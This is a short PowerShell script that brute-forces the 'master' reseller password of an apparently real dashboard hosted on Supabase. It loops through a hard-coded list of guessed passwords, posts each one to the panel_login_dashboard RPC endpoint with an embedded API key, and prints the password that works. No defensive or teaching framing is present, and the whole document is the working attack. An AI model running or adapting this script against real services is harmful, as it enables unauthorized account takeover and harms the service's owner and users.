$headers = @{
    apikey = 'sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM'
    Authorization = 'Bearer sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM'
    'Content-Type' = 'application/json'
}

foreach ($pass in @("123456", "admin", "eagle", "master", "eagle2026", "eagle2024", "onbesttv", "suporte24")) {
    $body = @{
        p_reseller_id = 'master'
        p_password = $pass
    } | ConvertTo-Json

    try {
        $resp = Invoke-RestMethod -Uri 'https://myreymyqsnikjdhnstjn.supabase.co/rest/v1/rpc/panel_login_dashboard' -Method Post -Headers $headers -Body $body
        Write-Host "FOUND MASTER PASSWORD: $pass" -ForegroundColor Green
        break
    } catch {
        # invalid
    }
}
